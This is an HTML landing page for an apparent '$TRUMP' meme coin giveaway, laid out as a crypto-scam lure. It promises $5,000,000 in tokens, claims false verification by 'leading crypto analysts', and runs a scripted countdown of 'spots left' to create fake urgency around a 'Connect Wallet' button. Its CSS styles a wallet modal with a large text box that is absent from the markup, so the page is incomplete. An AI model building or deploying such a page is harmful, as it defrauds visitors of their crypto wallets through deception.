<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Official Trump Meme Coin Giveaway</title>
  <style>
    /* General Reset */
    body, h1, h2, p, button, input, select, a, footer {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaWQ9by1wYWdlfHx8fGVufDB8fA%3D%3D') no-repeat center center/cover;
      color: #333;
      line-height: 1.6;
      overflow-x: hidden;
    }

    header {
      background: rgba(0, 86, 179, 0.8);
      color: #fff;
      text-align: center;
      padding: 20px 10px;
    }

    header img {
      max-width: 120px;
      margin-bottom: 10px;
    }

    header h1 {
      font-size: 2rem;
      margin-bottom: 5px;
    }

    header p {
      font-size: 1.2rem;
    }

    .balance {
      font-size: 1.5rem;
      font-weight: bold;
      margin-top: 10px;
    }

    .container {
      max-width: 900px;
      margin: 30px auto;
      padding: 20px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      transition: filter 0.3s ease;
    }

    .blurred {
      filter: blur(8px);
      pointer-events: none;
    }

    .wallet-page {
      display: none;
      background: #fff;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 400px;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      z-index: 1000;
    }

    .wallet-page.active {
      display: block;
    }

    .error {
      color: red;
      font-weight: bold;
      font-size: 0.9rem;
      text-align: center;
      background: #ffe6e6;
      padding: 8px;
      border: 1px solid red;
      border-radius: 5px;
      margin-bottom: 10px;
    }

    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }

    input, select, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 1rem;
    }

    textarea {
      height: 150px;
      resize: none;
    }

    /* Animated Buttons */
    .btn {
      display: block;
      width: 100%;
      padding: 15px;
      margin-top: 20px;
      font-size: 1.2rem;
      font-weight: bold;
      color: #fff;
      background: #ff4500;
      border: none;
      border-radius: 5px;
      text-align: center;
      cursor: pointer;
      transition: transform 0.2s, background 0.3s;
    }

    .btn:hover {
      background: #e03e00;
      transform: scale(1.05);
    }

    footer {
      text-align: center;
      margin-top: 30px;
      padding: 20px 0;
      background: #f1f1f1;
      color: #666;
    }

    /* Social Media Links */
    .social-links {
      margin-top: 15px;
    }

    .social-links a {
      margin: 0 10px;
      color: #0056b3;
      font-size: 1.2rem;
      text-decoration: none;
    }

    .social-links a:hover {
      text-decoration: underline;
    }

    .wallet-counter {
      font-size: 1.2rem;
      font-weight: bold;
      color: red;
      text-align: center;
      margin-top: 10px;
    }

    /* Mobile Optimization */
    @media (max-width: 600px) {
      .container {
        width: 90%;
        padding: 15px;
      }
      header h1 {
        font-size: 1.5rem;
      }
      .btn {
        font-size: 1rem;
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Header Section -->
  <header>
    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
    <h1>Trump Meme Coin Giveaway</h1>
    <p>Make America Great Again!</p>
    <div class="balance">$5,000,000 $TRUMP</div>
    <p><strong>Verified by leading crypto analysts.</strong></p>
  </header>

  <!-- Live Wallet Counter -->
  <div class="wallet-counter">
    Only <span id="wallet-count">2,000</span> spots left!
  </div>

  <!-- Landing Page Content -->
  <div class="container" id="main-content">
    <div class="card">
      <h2>Join the Revolution!</h2>
      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
    </div>
  </div>

  <!-- Footer Section with Social Media Links -->
  <footer>
    <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
    <div class="social-links">
      <a href="#">Twitter</a>
      <a href="#">Telegram</a>
      <a href="#">Discord</a>
    </div>
  </footer>

  <script>
    function showWalletPage() {
      document.getElementById('wallet-page').classList.add('active');
      document.body.classList.add('noscroll');
    }

    // Live Wallet Counter Simulation
    let count = 2000;
    setInterval(() => {
      if (count > 1800) {
        count--;
        document.getElementById('wallet-count').textContent = count;
      }
    }, 5000);
  </script>
</body>
</html>
